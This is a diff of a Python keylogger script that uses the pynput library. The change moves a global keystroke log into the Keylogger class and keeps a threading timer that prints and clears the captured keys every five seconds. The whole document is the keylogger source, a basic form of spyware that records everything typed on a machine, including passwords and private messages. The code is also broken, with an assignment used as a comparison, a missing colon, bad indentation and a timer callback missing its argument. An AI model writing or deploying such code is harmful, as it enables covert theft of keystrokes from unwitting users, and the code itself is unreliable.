@@ -3,29 +3,29 @@
 import pynput.keyboard
 import threading
 
-log =""
 
 class Keylogger:
 
+def __init__(self):
+   self.log=""
+
 def process_key_press(self,key):
-    global log
     try:
-        log=log+str(key.char)
+        self.log=self.log+str(key.char)
     except AttributeError:
         if key=key.space
-           log=log+" "
+           self.log=self.log+" "
         else:
-            log=log+" "+str(key)+" "    
+            self.log=self.log+" "+str(key)+" "    
     
-    print(log)
+    print(self.log)
 
 
 #We are using threading concept to report the log for a certain period of time. This threading allowas the keyboard listener function to execute without any interruption and also it runs timer on other hand. 
 
-def report(self):  
-    global log
-    print(log)
-    log=" "
+def report(self): 
+    print(self.log)
+    self.log=" "
     timer=threading.Timer(5, report)
     timer.start()
 
